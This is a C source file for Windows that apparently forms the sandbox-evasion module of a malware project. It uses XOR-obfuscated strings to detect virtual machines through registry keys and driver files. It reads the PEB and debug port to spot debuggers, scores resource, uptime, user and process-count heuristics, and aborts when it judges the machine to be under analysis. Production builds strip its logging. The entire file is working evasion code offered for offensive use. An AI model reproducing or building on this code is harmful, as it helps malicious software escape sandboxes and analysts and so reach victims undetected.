/*
 * Author: 28Zaakypro@proton.me
 * Sandbox evasion — VM, debugger, resource, uptime, user activity, process count checks
 */

#include "sandbox_evasion.h"
#include "obfuscation.h"
#include <tlhelp32.h>
#include <winternl.h>
#include "syscalls.h"

// Check VMware/VirtualBox/Hyper-V registry keys and known driver files
BOOL CheckVirtualMachine() {
    BOOL isVM = FALSE;
    HKEY hKey;

    // VMware
    BYTE obfVMwareKey[] = {0x31, 0x2F, 0x24, 0x32, 0x77, 0x03, 0x30, 0x05, 0x5E, 0x16, 0x2D, 0x34, 0x23, 0x30, 0x27, 0x6C, 0x22, 0x09, 0x2C, 0x21, 0x00, 0x5E, 0x16, 0x2D, 0x34, 0x23, 0x30, 0x27, 0x22, 0x32, 0x2E, 0x2E, 0x2E, 0x2B};
    char vmwareKey[64];
    DeobfuscateString(obfVMwareKey, 34, 0x42, vmwareKey);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmwareKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        #ifndef PRODUCTION
        printf("[!] VMware detected\n");
        #endif
        isVM = TRUE;
        RegCloseKey(hKey);
    }

    // VirtualBox
    BYTE obfVBoxKey[] = {0x31, 0x2F, 0x24, 0x32, 0x77, 0x03, 0x30, 0x05, 0x5E, 0x2F, 0x30, 0x23, 0x21, 0x2E, 0x27, 0x5E, 0x16, 0x2A, 0x30, 0x32, 0x33, 0x23, 0x2E, 0x04, 0x2E, 0x38, 0x22, 0x07, 0x33, 0x27, 0x2B, 0x32, 0x22, 0x03, 0x26, 0x26, 0x2A, 0x32, 0x2A, 0x2E, 0x2C, 0x2B};
    char vboxKey[64];
    DeobfuscateString(obfVBoxKey, 42, 0x42, vboxKey);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vboxKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        #ifndef PRODUCTION
        printf("[!] VirtualBox detected\n");
        #endif
        isVM = TRUE;
        RegCloseKey(hKey);
    }

    // Hyper-V
    BYTE obfHyperVKey[] = {0x31, 0x2F, 0x24, 0x32, 0x77, 0x03, 0x30, 0x05, 0x5E, 0x2D, 0x2A, 0x21, 0x30, 0x2E, 0x2B, 0x2E, 0x24, 0x32, 0x5E, 0x16, 0x2A, 0x30, 0x32, 0x33, 0x23, 0x2E, 0x22, 0x2D, 0x23, 0x21, 0x2A, 0x2C, 0x27, 0x5E, 0x07, 0x33, 0x27, 0x2B, 0x32, 0x5E, 0x10, 0x23, 0x30, 0x23, 0x2D, 0x27, 0x32, 0x27, 0x30, 0x2B};
    char hyperVKey[64];
    DeobfuscateString(obfHyperVKey, 49, 0x42, hyperVKey);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, hyperVKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        #ifndef PRODUCTION
        printf("[!] Hyper-V detected\n");
        #endif
        isVM = TRUE;
        RegCloseKey(hKey);
    }

    // Driver files: vmmouse.sys, vmhgfs.sys, VBoxMouse.sys, VBoxGuest.sys, vmci.sys (XOR 0x42)
    BYTE obfPaths[][60] = {
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x34, 0x2D, 0x2D, 0x2E, 0x2D, 0x33, 0x2B, 0x27, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x34, 0x2D, 0x2A, 0x2C, 0x2E, 0x24, 0x2B, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x16, 0x04, 0x2E, 0x38, 0x2D, 0x2E, 0x33, 0x2B, 0x27, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x16, 0x04, 0x2E, 0x38, 0x07, 0x33, 0x27, 0x2B, 0x32, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x34, 0x2D, 0x21, 0x2A, 0x00, 0x2B, 0x39, 0x2B}
    };

    for (int i = 0; i < 5; i++) {
        char path[60];
        SIZE_T len = 0;
        while (obfPaths[i][len] != 0) len++;
        DeobfuscateString(obfPaths[i], len, 0x42, path);
        if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
            #ifndef PRODUCTION
            printf("[!] VM driver found: %s\n", path);
            #endif
            isVM = TRUE;
        }
    }

    #ifndef PRODUCTION
    printf("[*] VM check: %s\n", isVM ? "detected" : "clean");
    #endif
    return isVM;
}

BOOL CheckDebugger() {
    BOOL isDebugged = FALSE;

    // PEB.BeingDebugged — avoids IsDebuggerPresent() API call (common IoC)
    #ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
    #else
    PPEB peb = (PPEB)__readfsdword(0x30);
    #endif

    if (peb && peb->BeingDebugged) {
        #ifndef PRODUCTION
        printf("[!] PEB.BeingDebugged = TRUE\n");
        #endif
        isDebugged = TRUE;
    }

    // NtQueryInformationProcess(ProcessDebugPort) — detects remote debuggers
    typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
        HANDLE, DWORD, PVOID, ULONG, PULONG
    );

    BYTE obfNtdll[]   = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    BYTE obfNtQuery[] = {0x2C, 0x32, 0x11, 0x33, 0x27, 0x30, 0x39, 0x09, 0x2C, 0x24, 0x2E, 0x30, 0x2D, 0x23, 0x32, 0x2A, 0x2E, 0x2C, 0x10, 0x30, 0x2E, 0x21, 0x27, 0x2B, 0x2B};
    char ntdll[16], ntQuery[32];
    DeobfuscateString(obfNtdll, 9, 0x42, ntdll);
    DeobfuscateString(obfNtQuery, 25, 0x42, ntQuery);

    HMODULE hNtdll = GetModuleHandleA(ntdll);
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, ntQuery);

    if (NtQueryInformationProcess) {
        DWORD debugPort = 0;
        NTSTATUS status = NtQueryInformationProcess(
            GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL
        );
        if (status == 0 && debugPort != 0) {
            #ifndef PRODUCTION
            printf("[!] Debug port active\n");
            #endif
            isDebugged = TRUE;
        }
    }

    #ifndef PRODUCTION
    printf("[*] Debugger check: %s\n", isDebugged ? "detected" : "clean");
    #endif
    return isDebugged;
}

BOOL CheckSystemResources() {
    BOOL lowResources = FALSE;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    #ifndef PRODUCTION
    printf("[*] CPUs: %d\n", sysInfo.dwNumberOfProcessors);
    #endif
    if (sysInfo.dwNumberOfProcessors < 2) {
        #ifndef PRODUCTION
        printf("[!] Less than 2 CPUs\n");
        #endif
        lowResources = TRUE;
    }

    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    DWORD ramGB = (DWORD)(memStatus.ullTotalPhys / (1024 * 1024 * 1024));

    #ifndef PRODUCTION
    printf("[*] RAM: %d GB\n", ramGB);
    #endif
    if (ramGB < 4) {
        #ifndef PRODUCTION
        printf("[!] Less than 4 GB RAM\n");
        #endif
        lowResources = TRUE;
    }

    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        DWORD diskGB = (DWORD)(totalBytes.QuadPart / (1024 * 1024 * 1024));
        #ifndef PRODUCTION
        printf("[*] Disk C: %d GB\n", diskGB);
        #endif
        if (diskGB < 80) {
            #ifndef PRODUCTION
            printf("[!] Less than 80 GB disk\n");
            #endif
            lowResources = TRUE;
        }
    }

    #ifndef PRODUCTION
    printf("[*] Resources check: %s\n", lowResources ? "low" : "ok");
    #endif
    return lowResources;
}

BOOL CheckUptime() {
    DWORD uptime  = (DWORD)(GetTickCount64() / 1000);
    DWORD minutes = uptime / 60;

    #ifndef PRODUCTION
    printf("[*] Uptime: %d h %d min\n", minutes / 60, minutes % 60);
    #endif

    if (minutes < 10) {
        #ifndef PRODUCTION
        printf("[!] Uptime < 10 min — sandbox indicator\n");
        #endif
        return TRUE;
    }
    return FALSE;
}

BOOL CheckUserActivity() {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("C:\\Users\\*", &findData);
    int userCount = 0;

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                strcmp(findData.cFileName, ".")       != 0 &&
                strcmp(findData.cFileName, "..")      != 0 &&
                strcmp(findData.cFileName, "Public")  != 0 &&
                strcmp(findData.cFileName, "Default") != 0)
            {
                userCount++;
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    #ifndef PRODUCTION
    printf("[*] User profiles: %d\n", userCount);
    #endif

    if (userCount < 1) {
        #ifndef PRODUCTION
        printf("[!] No user profile found\n");
        #endif
        return TRUE;
    }

    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&lii);
    #ifndef PRODUCTION
    printf("[*] Idle time: %d s\n", (GetTickCount() - lii.dwTime) / 1000);
    #endif

    return FALSE;
}

BOOL CheckProcessCount() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return FALSE;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    int count = 0;

    if (Process32First(hSnapshot, &pe32)) {
        do { count++; } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);

    #ifndef PRODUCTION
    printf("[*] Process count: %d\n", count);
    #endif

    if (count < 50) {
        #ifndef PRODUCTION
        printf("[!] Less than 50 processes\n");
        #endif
        return TRUE;
    }
    return FALSE;
}

BOOL CheckSandboxEnvironment(EVASION_RESULT* result) {
    #ifndef PRODUCTION
    printf("[*] Sandbox checks...\n");
    #endif

    result->isSandbox        = FALSE;
    result->isVM             = FALSE;
    result->isDebugger       = FALSE;
    result->hasLowResources  = FALSE;
    result->score            = 0;

    result->isVM = CheckVirtualMachine();
    if (result->isVM) result->score += 30;

    result->isDebugger = CheckDebugger();
    if (result->isDebugger) result->score += 40;

    result->hasLowResources = CheckSystemResources();
    if (result->hasLowResources) result->score += 20;

    if (CheckUptime())       result->score += 15;
    if (CheckUserActivity()) result->score += 10;
    if (CheckProcessCount()) result->score += 15;

    result->isSandbox = (result->score >= 30);
    return result->isSandbox;
}

void PrintEvasionResult(EVASION_RESULT* result) {
    #ifndef PRODUCTION
    printf("[*] Evasion score: %d | VM:%s Dbg:%s LowRes:%s\n",
        result->score,
        result->isVM            ? "yes" : "no",
        result->isDebugger      ? "yes" : "no",
        result->hasLowResources ? "yes" : "no");

    if      (result->score >= 50) printf("[-] Verdict: sandbox (certain)\n");
    else if (result->score >= 30) printf("[-] Verdict: sandbox (probable)\n");
    else                          printf("[+] Verdict: real environment\n");
    #endif
}

BOOL ShouldExit(EVASION_RESULT* result) {
    if (result->score >= 50 || result->isDebugger) {
        #ifndef PRODUCTION
        printf("[-] Hostile environment — aborting\n");
        #endif
        return TRUE;
    }
    #ifndef PRODUCTION
    printf("[+] Environment acceptable — continuing\n");
    #endif
    return FALSE;
}
